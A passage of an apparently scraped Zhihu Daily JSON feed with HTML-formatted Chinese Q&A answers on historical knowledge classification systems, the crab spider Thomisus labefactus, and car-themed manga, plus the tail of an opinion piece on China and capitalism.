没有必要重复发明轮子，就好像中国发明造纸术、印刷术，欧洲也不会发明出另外一种形式的“书”。</p>\n<p>资本主义的血腥扩张导致了欧洲对中国的侵略和殖民，这使得中国曾经大大落后于欧洲。</p>\n<p>现在把中国与西方掉个个儿，是不是正好能够回答这个问题？</p>\n<p>正是因为西方资本主义的高度发展，使得他们对资本产生了生理依赖，根本摆脱不掉；反观中国，我们已经拆除了地面上的一切违建，万丈高楼平地起。这就是盘旋上升，这就是祸兮福所依，福兮祸所伏。</p>\n<p>而我们的根基正是两千多年的大一统，与生俱来带着“天下为公”、“大同世界”的理想，马克思指给我们路径，但道路千万条，为什么我们会选择这条路？因为我们数千年来本就朝着那个方向奋斗着。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/452023901\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737854"},{"title":"如何对知识分类？","date":"2021-07-07 23:06:35","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-1b2889cd21a77789194e961efc7f6f09_l.jpg?source=8673f162\"><span>ag獭，</span><span>好奇而无用的獭獭</span>\n<a href=\"https://www.zhihu.com/question/20716696/answer/1916421893\" hidden>阅读原文</a>\n</div>\n<div>\n<p>想做一个按照知识树和标签对内容进行分类，以便采集信息、整理资源、进行讨论的网络平台。之前为了对网络和文献中的信息进行分类，根据中国大百科全书和中图分类法制作了一张分类图——</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3aa12fd8e16a7cdce35197b517e3a901_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然，上图的知识树主要是根据现代的学科设置进行分类的，近期在查找资料，整理古代世界科学发展的过程中，能够很真切地了解到，古人对世界的认识、对学科和事物的分类，与今天人们的观念是非常不同的。</p>\n<p><strong>古代的知识分类</strong></p>\n<p><a href=\"https://www.zhihu.com/question/20454603/answer/719776178\">历史上有哪些全才全能型的人物？</a></p>\n<p>我们今天说到毕达哥拉斯，会说他是古希腊数学家、哲学家，而在毕达哥拉斯眼中“数即万物”，他的数学观念，其实是和他的哲学观、宗教观一脉相承的，彼此并无明确的界限。今天说到葛洪，我们会说他是魏晋时代的道教学者、炼丹家、医学家，而在葛洪的时代，炼丹和医学，其实也是和他的道教实践融为一体的。可见在古人眼中，学科的界限，往往并没有当下那么明晰，今天所说的物理、化学、哲学，在古人眼中，也许属于同一类认识世界，解释世界的方法，在文艺复兴时的欧洲，大概可以笼统的被归入自然哲学的范畴。</p>\n<p>科学科学，字面上理解，可以看做是分科的学术，细致明确的知识和学科分类，可说是近现代学术的主要特征之一。如何对知识进行分类，体现着对世界的看法，那么在古人眼中，知识和学科的分类又是如何的呢？</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b969580c405d54e8ef96877523d707c3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《尔雅》</figcaption></figure><p>为了更好地认识万物，很久以前，先民就开始对事物进行分类。最初的分类，主要是关于平日接触的动植物、矿物等。成书于战国至两汉时代的词典《尔雅》，将动物分为鸟兽鱼虫四大类，这大概是我国最早的动物分类。大约同时代，古希腊哲学家亚里士多德根据动物的性状，将其分为冷血动物、温血动物等类别，并按照其构造完善程度依次排列，形成高低有序的阶梯。</p>\n<p>随着书面著作的增加，以及教育的体系化，为了便于检索收藏，东西方古文明先后发展出了不同的图书编目和学科划分体系，和上面所说的生物分类比较，图书编目和学科划分更关注知识和内容本身，大致就相当于古人的知识分类体系。</p>\n<p><strong>古代中国的知识分类</strong><strong><strong>刘歆与六略</strong></strong></p>\n<p>河平三年（公元前 26 年），光禄大夫刘向受命整理校对宫廷藏书，并为每本书撰写简明提要，汇编为《别录》，刘向将《别录》中的 603 种图书分为 6 大类，38 小类。刘向死后，其子刘歆以《别录》为基础，删去内容提要，编为《七略》，其中的《辑略》，是关于古代学术发展的简史，因此本书虽然名为《七略》，其实还是将宫廷藏书分为 6 类，分别为——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c38b66ee3ba96a9938e6666ff57fee43_720w.jpg?source=8673f162\" alt=\"\"></figure><p>可见，今天我们所说的古代科技著作，在两千多年前的中国，大多被归为术数与方技（合称方术）之类，与占卜、风水、修仙等并列，和今天的认知观念显然大为不同。</p>\n<p>东汉班固在编写《汉书》时，以刘歆的《七略》为基础，保留其图书分类，删去提要部分，增补了其后的一些学者著作，将其改编为《汉书·艺文志》。此后，历代的官修史书大多都仿制其体例，编有图书目录性质的艺文志或经籍志。</p>\n<p><strong><strong>经史子集</strong></strong></p>\n<p>七略之后，先后有学者编写了《七志》《七录》等图书目录，但最终在中国产生巨大影响的，则是经史子集的四部分类法。四部分类法可以追溯至西晋开国功臣荀勖编写的《晋中经簿》，他将六略改编为甲（经）乙（子）丙（史）丁（诗赋）四部。东晋的李充进一步完善了四部分类，最后在唐代名臣魏征编写的《隋书·经籍志》，经史子集的四部分类最终确立，几乎成为中国古代的官方图书分类标准，其后千年虽有调整，大体结构却保持不变。</p>\n<p>《隋书·经籍志》收录四部经传 3127 部，36708 卷，注释中附有梁至隋代遗失图书 1064 部，12759 卷，共计 4191 部，49467 卷，分经史子集 4 大类，40 小类，以及编外的佛录、道录，具体为——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2ba82c2c837c5de45ad2af4760c77de8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>完善版的经史子集：《四库全书总目》</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b56b4e7a8b385e756633898c0735ff98_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《四库全书》</figcaption></figure><p>清代的《四库全书》，是中国古代规模最大的丛书，其中的目录和提要部分，即《四库全书总目》按照经史子集的四部分类，将 10254 种图书分为 4 部 44 类，一些类进一步分为若干小类，代表着经史子集四部分类法在千年之后的演化形式，具体为——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b0cea8f8482565e989edcf4323b9ebcd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>百科类书</strong></strong></p>\n<p>类书是中国古代的大型工具书，它的定位类似今天的百科全书和索引图书，往往辑录了许多书中的材料，并按照一定的门类进行分类。著名的类书有三国时的《皇览》，唐代的《艺文类聚》，宋代的《太平御览》《太平广记》《册府元龟》，明代的《永乐大典》，清代的《古今图书集成》等。</p>\n<p>类书的分类方式并不固定，有以经史子集四部进行归类的，也有自创分类的，这里不一一列举，有兴趣的可以自己查询相关类书的介绍，感受下它们的分类规则。</p>\n<p><strong>陈梦雷的《古今图书集成》</strong></p>\n<p>清代学者陈梦雷编纂的《古今图书集成》是中国古代规模最大、资料最丰富的类书。《古今图书集成》全书共 1 万卷，约 1.6 亿字，仅目录就有 40 卷，收录了天文地理历史人文音韵艺术等各方面的内容，保留了大量古籍中的文字内容。全书分为 6 编，32 典，6109 部，图示如下——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9b752f091ffa93763d1f7ff51c11037b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>梁启超的《</strong>西学书目表<strong>》</strong></strong></p>\n<p>清代末年，面临千年未有变局，各界人士救亡图存，将西方图书引入中国。为了对翻译来的西方图书进行宣传整理，著名学者梁启超编写了《西学书目表》，将图书分为西学、西政、杂类三大类，打破了传统的经史子集四部分类，对近代西方图书分类法的输入产生了一定影响，具体为——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-71384bf575627349778cf72103c64916_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>古代西方的知识分类</strong></p>\n<p>古代西方的知识分类，与图书馆的发展密不可分。最早的图书分类也许来自两河流域，亚述王朝末代君主亚述巴尼拔曾在尼尼微建立图书馆，收集了 2.5 万多块泥版文献，每块泥版上都有标记，表明其收藏地点。为了便于检索，又制作了一些泥版图书目录。随着亚述王朝覆灭，亚述巴尼拔图书馆的大量泥版被埋藏在废墟中，不为人知，直到 1845-1854 年期间被考古学家重新发掘。</p>\n<p><strong>亚里士多德的学科观</strong></p>\n<p>在亚里士多德之前，古希腊学术已经有了相当的发展，不同领域已经出现了问题分类的雏形，但真正的学科分类则是从亚里士多德开始的。亚里士多德认为：“所有思想要么是实践性的，要么是生产性的，要么是理论性的。”把知识划分为生产（诗歌）、理论和实践三部分，如图所示——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ebd8e33a0761b32092a261b4cb56ccdb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>卡利马科斯的《书表》</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fe72087bebd5bf9f04b48628aed61d9d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>亚历山大里亚图书馆</figcaption></figure><p>传说亚历山大里亚图书馆的卡利马科斯（Callimachus，公元前 310- 前 240）编写了西方世界的第一份书目 Pinakes（意为书表）。全书长达 120 卷，但如今仅存残片，无法了解其全貌。关于卡利马科斯的图书分类，有 6 大类、8 大类、12 大类之说，一般认为包括——修辞、法律、史诗、悲剧、喜剧、抒情诗、历史、医学、数学、自然科学和其他几大类。每一类均按照作者字母或年代排序，附有生平和图书信息的简介。</p>\n<p><strong>古典七艺</strong></p>\n<p><a href=\"https://www.zhihu.com/question/39028993/answer/645270344\">真正的精英教育是怎样的？</a></p>\n<p>教育，是知识分类体系的另一源流。柏拉图之后，古希腊逐渐形成了以语法、逻辑和修辞为基础，注重演讲和思辨的教育特色。这一传统随后被罗马继承和发展。形成了以语法、逻辑和修辞为基础学科（Trivium），天文、几何、算术和音乐为进阶学科（Quadrivium）的教育传统。</p>\n<p>西罗马灭亡之后，教会成为古典文明的避难所。修道士卡西奥多鲁斯（Cassiodorus，490-583）在意大利南部建立维瓦留姆修道院，以个人藏书为基础建立了图书馆。他致力于发展教育，强调要研究非宗教书籍，以加深对《圣经》的理解。为此，卡西奥多鲁斯收集了大量世俗藏书，在修道院内设置了抄书室，并配有装订工人。在卡西奥多鲁斯和同时代的西班牙神学家波伊提乌（Boëthius）、圣伊西多（Isidore）等人的总结发展下，古典时代的教育被定型为包括前三艺（Trivium）和后四艺（Quadrivium）在内的“七艺”教育，成为西方中世纪教育的规范。</p>\n<p><strong>格斯纳的《世界书目》</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-08665c2589420ee7e10b9eedaf12588a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《世界书目》</figcaption></figure><p>文艺复兴时期的瑞士博学家康拉德·格斯纳（Conrad Gesner）编写的《世界书目》（Bibliotheca universalis），是印刷术发明后，欧洲的第一部综合性书目。《世界书目》收录了约 3000 位作家的 12000 多本图书，将其按字母排序，并添加双向索引以便检索，他的工作被认为是培根等百科全书式学者的先驱。格斯纳后来准备出版一本 21 卷的分学科增订版书目，其中的药物卷从未被出版过，已出版和计划中的分卷包括：语文学、辩证法、修辞、诗歌、算术、数学、音乐、天文、占星、神秘学、地理、历史、机械、自然哲学、形而上学、道德哲学、经济学、政治学、法学、基督教哲学和药学。</p>\n<p><strong>法国人的贡献</strong></p>\n<p>法国图书馆学者 Gabriel Naudé（1600-1653）曾为当时执掌法国大权的枢机主教马扎然管理图书馆。图书馆的藏书一度达到 4 万卷，是法国第一个面向公众开放的图书馆。为了有条理的组织藏书，Naudé建立了一个 7 大类的分类系统，包括：神学、医学、法学、历史、哲学、数学和人文学科，和之前的分类法相比，Naudé的分类已经和今日的学科分类比较接近。后来，他又将大类扩充至 12 种。</p>\n<p><strong>狄德罗和达朗贝尔之树</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/7ca371e3ca5ddc6ad9a4e389e39af566_720w.jpg?source=8673f162\" alt=\"\"><figcaption>具象人类知识系统，有时也被称为狄德罗和达朗贝尔之树</figcaption></figure><p>18 世纪，法国掀起了声势浩大的启蒙运动，这是堪与文艺复兴媲美的人类思想史上的大事。1751-1772 年间，在书商布雷顿策划下，以哲学家狄德罗为主编，数学家达朗贝尔为副主编，孟德斯鸠、魁奈、杜尔哥、伏尔泰、卢梭、布丰等约 150 位学者，参与编写了著名的《百科全书，或科学、艺术和工艺详解词典》（Encyclopédie, ou dictionnaire raisonné des sciences, des arts et des métiers，一般称为百科全书）。这被认为是史上第一部总括科学、艺术的综合性百科全书。</p>\n<p>从工具书角度而言，狄德罗和达朗贝尔的百科全书并非完美，书中词条质量不一，一些词条夹叙夹议，不够客观。使其流芳百世的是其思想价值，用狄德罗的话说，就是以此“改变人们的思维方式。”为此，狄德罗和达朗贝尔为百科全书编制了一份全面的知识图谱，名为具象人类知识系统（Système figuré des connaissances humaines），将人类知识分为记忆 / 历史、理智 / 哲学、想象 / 诗歌三大领域（这种划分可以追溯至英国思想家弗朗西斯培根），整理成汉化版如下——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c9d0942e5b1ccc849a6124d91bcac146_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>近现代图书分类法</strong></p>\n<p>1842 年由 Jacques Charles Brunet 创立的巴黎书商分类法，被认为是第一种现代图书分类法。巴黎书商分类法将图书分为神学、法学、科学与艺术、历史、美文学五大类。今天，常用的图书分类法还包括杜威十进制图书分类法、通用十进制图书分类法、美国国会图书馆图书分类法等。偷懒一下，就直接摘录维基上的介绍了。</p>\n<p>杜威十进制图书分类法（Dewey Decimal Classification）</p>\n<blockquote>1876 年由美国图书馆专家麦尔威·杜威撰写并出版。起初该分类法内容仅描述于 4 页折页中，但经历扩充至并进行 23 次主要改版，最近一次修订是在 2011 年完成。该分类法在小型图书馆应用较广。十大分类包括——<br>000 - 总类<br>100 - 哲学与心理学<br>200 - 宗教 <br>300 - 社会科学 <br>400 - 语文 <br>500 - 自然科学 <br>600 - 应用科学 <br>700 - 艺术 <br>800 - 文学 <br>900 - 历史与地理</blockquote>\n<p>通用十进制图书分类法（Universal Decimal Classification）</p>\n<blockquote>19 世纪末，在杜威十进制图书分类法基础上，比利时书目学家 Paul Otlet、Henri la Fontaine 研发了这种分类。此种分类方法由数字和特殊符号组成，在世界各地被广泛使用。分类包括——<br>0 总汇<br>1 哲学，心理学<br>2 宗教，神学<br>3 社会学，政治，经济，法律，教育，人类学<br>4 暂无（由图书馆具体添加）<br>5 自然学科，数学<br>6 实用学科，医学，科技，企业经济学，计算机<br>7 艺术，手工艺品，音乐，竞技，体育<br>8 语言学，文学<br>9 地理，生物，历史</blockquote>\n<p>美国国会图书馆图书分类法（Library of Congress Classification）</p>\n<blockquote>是美国国会图书馆使用的图书分类法，首次采用于约 19 世纪末期至 20 世纪初期。现时为不少欧美大学图书馆所采用，它用了 26 个英文字母其中的 21 个作分类代码。大类分别为——<br>A - 总类<br>B - 哲学、心理学、宗教<br>C - 历史学和相关科学总论<br>D - 世界史（除美国史）<br>E - 美国史<br>F - 前英属、荷属、法属美洲和拉丁美洲地方史<br>G - 地理、人类学、休闲<br>H - 社会科学<br>J - 政治科学<br>K - 法律<br>L - 教育<br>M - 音乐<br>N - 艺术<br>P - 语言与文学<br>Q - 科学<br>R - 医学<br>S - 农业<br>T - 技术<br>U - 军事科学<br>V - 海军科学<br>Z - 目录学, 图书馆科学</blockquote>\n<p><strong>古代伊斯兰世界的知识分类</strong></p>\n<p>卡利马科斯的图书分类法以及亚里士多德的哲学对整个地中海世界都产生了影响，其中也包括中世纪的伊斯兰世界。</p>\n<p><strong>al-Nadim 的 Kitābal-Fihrist</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b4f757d23592b62e1fb55cae1722ee59_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Kitābal-Fihrist</figcaption></figure><p>Ibn al-Nadim（932-995）是巴格达的书商兼传记作者。他受古希腊和罗马启发，编写了一部包括约 2000 位作者，10000 本书的书目 Kitābal-Fihrist，被认为是广义西方的第一部综合性书目。Kitābal-Fihrist 收罗了从印度到罗马的古今书籍（其中的波斯书籍今天几乎都已经遗失），并列出其体裁、章节和概要以便检索，分类大致如图——</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3b1e057975a665be85557cb1045bfe36_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>法拉比的《科学之统计》</strong></p>\n<p>中亚和波斯是伊斯兰世界的主要学术中心，这里的学者也根据自己对世界的认识，将知识分为若干类别。喀喇汗王朝的著名学者法拉比（Al-Farabi，872-950）将哲学视为知识的总和，将其初步划分为理论哲学与实践（市民）哲学，理论哲学大约对应今天的哲学和自然科学，实践哲学则大致对应社会科学。在其著作《科学之统计》中，法拉比提出了如下的学科分类——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-97693c817233683cf114dd65e51fd84d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>花拉子米的学术分类</strong></p>\n<p>法拉比的分类法被其后的著名思想家伊本西那、纳西尔丁.图西等采纳，虽有改动，但区别不大。另一种学科分类法来自花拉子米（Abu Abdullah al-Khwarizmi，？-997，不是创立代数的那位花拉子米）。花拉子米认为学术不仅是关于事物的知识，也是关于真主和神启的知识，是特殊人群的财富，他的分类大致是——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e998335cead9c4e81b3c839586132d2f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>设拉子的《王冠之珠》</strong></p>\n<p>最后一种分类法由安萨里（Al-Ghazali，1058-1111）、Fakhr al-Din al-Razi（1150-1210，不是炼金术士拉齐）和库特布丁.设拉子（Qutb al-Din Shirazi，1236-1311）创立。在其著作《王冠之珠》中，设拉子将学术分为哲学和非哲学两大类，认为哲学是不受时间地点影响的永恒真理，非哲学则会随时间、地域、族群而受到影响，可分为宗教和非宗教的，他的分类大致如下——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d50d86cce814eb1acdeb737385ce7561_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>古代古印度的知识分类</strong></p>\n<p>吠陀时代的印度重视口传而无视文本，即使在塔克西拉那样的学术中心，也没有找到文献和图书馆的痕迹。佛教兴起后，注重以文本辅助教学，记载教义，于是在古印度，也出现了图书馆那样的藏书机构。最有名的古代图书馆位于那烂陀寺，这是印度古代的佛教学术中心，吸引了包括唐僧在内的各方僧众来此学习。但可惜的是，那烂陀寺最终毁于穆斯林的侵略，其中的书籍经卷也荡然无存。（古代波斯和中亚的学术文献大多也毁于战火，其实这些文明并不是没有写过文献，只是未能流传下来）</p>\n<p>和印度庞大的人口比起来，古代印度传世文献的数量，实在少得可怜。一方面，这和印度文化的传统有关，另一方面，印度湿热的气候，以及战火的破坏，也不利于文献的保存。一番查找之后，并没有找到古代印度的学科分类，有了解的朋友，可以补充一下。</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/List_of_historic_Indian_texts\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>en.wikipedia.org/wiki/L</span><span>ist_of_historic_Indian_texts</span><span></span></a></p>\n<p>维基上关于莫卧儿统治之前印度文献的归类，其中的书籍数量尚不及西汉《七略》所载，去除宗教经典，所剩更是不多……</p>\n<p>最后打个广告，如果有了解网站制作，并且对开发回答开头描述的平台有兴趣的朋友，可以联系我呀~</p>\n<p><strong>简化版答案——</strong></p>\n<p><a href=\"https://www.zhihu.com/question/22305797/answer/1934016028\">如何用一张图描述人类的知识图谱？</a></p>\n<p><strong>相关内容——</strong></p>\n<p><a href=\"https://www.zhihu.com/question/24730824/answer/62033344\">有哪些值得你推荐的百科全书?</a><a href=\"https://www.zhihu.com/question/33889180/answer/810113870\">哪些网站帮你打开了新世界的大门？</a><a href=\"https://www.zhihu.com/question/309999864/answer/581075670\">有什么不错的搜索引擎推荐？</a><a href=\"https://zhuanlan.zhihu.com/p/35468607\">ag 獭：【破障行动】免费网络资源推荐名录 1</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/20716696\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737861"},{"title":"有哪些长相比较逆天的昆虫？","date":"2021-07-07 23:06:27","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-9f00f638c8ea3ae209cc19762f245539_l.jpg?source=8673f162\"><span>地平线HOA，</span><span>简单、有趣、认真的科普。『公众号同名』</span>\n<a href=\"https://www.zhihu.com/question/37368107/answer/1978218850\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>“恐…恐怖机器人？”</strong></p>\n<p><strong>1.“真实的”科普</strong></p>\n<p>前两天在路边一块大石头上，看到这么个玩意儿↓</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7ecc1115317455aab5c5f7cb5ef3aa8b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>睿智的我果断求助了朋友圈的大佬：</p>\n<blockquote>——“这啥啊？”<br><br><br>——“小…螃蟹？”<br><br>——“小蜘蛛？”<br><br>——“别瞎说，蜘蛛八条腿！”<br><br>——“看着像个昆虫幼虫？”<br>——“某不知名海洋生物？”<br><br>……<br><br><br>——“额，<strong>恐怖机器人？</strong>”</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-acdb98fa4f45ea269d82a94b9e2e5dd7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8aeebf77700772e27ca4cf397d826808_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>（别说，还挺像的…）</strong></p>\n<p><strong>2.身背白面馍馍的三角脸星人</strong></p>\n<p>这个东东叫<strong>“三角蟹蛛”</strong>，拉丁学名<em>Thomisus labefactus</em>，普遍分布于平地至低海拔山区。</p>\n<p>“三角蟹蛛”这个名字取得是相当的传神，把它的两个特点概括得清清楚楚：</p>\n<p>①三角脸↓</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-67335dc2d28484c4d4fa7fb446dcc8dc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不禁让人联想到↓</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-df872c6f36c0ded0cdf86d8b8547a052_720w.jpg?source=8673f162\" alt=\"\"></figure><p>②远看像个小螃蟹↓</p>\n<p>（尤其是前面两对“胳膊”合起来的时候）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-60b40640bc3cf24b33494ede29bcb17f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>人们对蜘蛛通常有两个印象：<strong>有毒</strong>、<strong>结网</strong>。好巧不巧，这俩特征三角蟹蛛都没沾上。</p>\n<p>不过，你要是认为三角蟹蛛性情温顺那就错了，它可是个狠角色。如果说一般的蜘蛛靠毒液和蛛网安静地“务农”，那么三角蟹蛛就是一个四处游荡、以小博大的“猎手”。</p>\n<p>三角蟹蛛长得很“迷你”，最大的个体也就 1 厘米左右。虽然的个头虽然比较捉急，它却能猎捕大自己好几倍的昆虫，比如蝴蝶、飞蛾、蜜蜂等等。</p>\n<p>它们是耐心的猎手，静静在花朵上潜伏着……</p>\n<p>机会来了！</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b07d113eca0ce156c8ce61f1a1f03152_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a81bf85b76c44c24146c623555c22ce8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-5b881ad357239ec4052384ac4e512813_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>三角蟹蛛的雌雄个体差异很大。</strong></p>\n<p>和雄性相比，雌性三角蟹蛛的体型大得多：成年雌性能长到 12mm，而雄性一般不会超过 5mm。</p>\n<p>除了体型，雌雄个体的颜色差异更明显。雌性以白色为主，而雄性大多以棕褐色为主。</p>\n<p><em>雄性</em></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1cd3965cfcb22e2cb1577b9170f28560_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a55c199738e96789696adc39bfb8d7e3_720w.jpg?source=8673f162\" alt=\"\"></figure><p><em>雌性</em></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-78494fdcf702ff875005691ec6f1c61c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>乍一看简直是两个物种……</p>\n<p>其实，抛开那些固有偏见，这些小家伙还是挺可爱的。如果你想知道，它们的确可以做<strong>暂时的宠物</strong>。</p>\n<p>为什么是暂时的呢？</p>\n<p>因为三角蟹蛛的生命很短暂，大概只有三个多月的时间。</p>\n<p>它们通常在每年的 6 月至 9 月活动，中间的 7 月到 8 月则用来繁衍后代。这个时候，雌蛛会把叶子卷成粽形的巢，然后在里面产卵。</p>\n<p>比较特别的是，小宝宝出生后不会马上开始发育，而是越过冬天后，在次年 6 月开始生长。<em>（这个说法来自拓展阅读 2，但暂时没有找到其他佐证，存疑）</em></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6cc5877ec9410fb59483e5fcbea24f4d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>疑似在卿卿我我的雌雄个体↑</p>\n<p><strong>拓展阅读：</strong></p>\n<p>1. <em>香港常见蜘蛛网，</em></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//hkspider.owlhk.org/spider/thomisus-labefactus\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>hkspider.owlhk.org/spid</span><span>er/thomisus-labefactus</span><span></span></a></p>\n<p>2. <em>ーモアセンスのある顔の蜘蛛！！『アズチグモ』，</em></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//konchulivetogether.com/thomisus-labefactus/%23toc2\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>konchulivetogether.com/</span><span>thomisus-labefactus/#toc2</span><span></span></a></p>\n<p>3. <em>三角蟹蛛 Thomisus labefactus Karsch, 1881，</em></p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//gaga.biodiv.tw/new23/9402/36.htm\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>gaga.biodiv.tw/new23/94</span><span>02/36.htm</span><span></span></a></p>\n<p><strong>©版权所有，转载请后台留言申请</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/37368107\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737874"},{"title":"除了《头文字 D》还有哪些经典的汽车题材漫画？","date":"2021-07-07 23:06:22","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-9d52de5b9496a5c55533425e79b6f428_l.jpg?source=8673f162\"><span>彬帝，</span><span>漫画爱好者，钟爱盘点类回答</span>\n<a href=\"https://www.zhihu.com/question/60780485/answer/1977925382\" hidden>阅读原文</a>\n</div>\n<div>\n<p>除了 <a href=\"http://www.zhihu.com/people/5b4c4c40369aa3294b09f8e4bd715f23\">@孟德尔</a> 书记提到的《湾岸竞速 MIDNIGHT》外，我再补充几部我知晓的</p>\n<p><strong><strong>四驱兄弟</strong></strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f48da9214059bb834d5aeea1dffcc54f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>赛道之狼</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b93e94634d47841fa58c65e66ed915eb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>超时空甩尾</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4b57ab9869d0ea01946a9b2ccbedb92b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>极速方程式</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-83a4a19996217cc507d381a1c7cc8baa_720w.jpg?source=8673f162\" alt=\"\"></figure><p>关于汽车题材的漫画，之前看过一篇不错的文章分享给大家</p>\n<p>原文链接：<a href=\"http://link.zhihu.com/?target=http%3A//cache.baiducontent.com/c%3Fm%3D92Cv8o8i192KDvu1KahMiz8njRB7ScqokVoLpZaPkLSbVdjqtbODrW1v2FEY0CMZkxRARkiW466vWzNRaclj16-xriHVOdFWBEsw_-V1WbloqIZYuFZcoprkI5Ma7C3Ng0cohhoJdPIC5H8DYGAss_%26p%3D927dc54ad5c346f742bfd32d02148b%26newp%3D907dc54ad5c346b90be2962b4a549f231610db2151d4d701298ffe0cc4241a1a1a3aecbf2c281204d4c67c6d05a4485becf133723d0034f1f689df08d2ecce7e39%26s%3Dcfcd208495d565ef%26user%3Dbaidu%26fm%3Dsc%26query%3D%25C8%25FC%25B5%25C0%25D6%25AE%25C0%25C7%26qid%3Dec502c51004835f0%26p1%3D1\" target=\"_blank\" rel=\"nofollow noreferrer\">不是只有《头文字 D》的秋名山才有老司机_漫画</a></p>\n<p><strong>·汽车漫画是什么时候兴起的?</strong></p>\n<p>说到漫画中的汽车，要追溯到 20 世纪初。汽车诞生初期它就走进漫画了，不过当时还不是主角，只是在一些描写现实生活、讽刺社会现状的漫画中带有一些有汽车的情节。日本漫画祖师级人物北泽乐天笔下的漫画里就出现过不少汽车相关的故事，应该算是汽车漫画的起源。</p>\n<p>说北泽乐天可能比较陌生，但要是说漫画之神手冢治虫都是受他影响，这个人的地位就清楚了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0121ab0a29cd983c920dd64a863aa91d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>20 世纪初北泽的漫画以政治讽刺为主，里面描写过当时权贵有汽车的时代，汽车与庶民间的关系，用一系列小人物的故事来表现平民对汽车的看法与感情，算是最早的汽车相关漫画。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0f92f830e79958d9de9de297431ce626_720w.jpg?source=8673f162\" alt=\"\"></figure><p>随着时代的发展，漫画在日本形成一种文化，几乎任何东西都可以成为漫画的主题和元素，汽车也不例外。汽车真正成为漫画的主角还要追溯到 20 世纪 60 年代，一些机甲类的科幻作品涌现，同时也有一些描写赛车比赛的漫画出现。1960 年漫画《少年 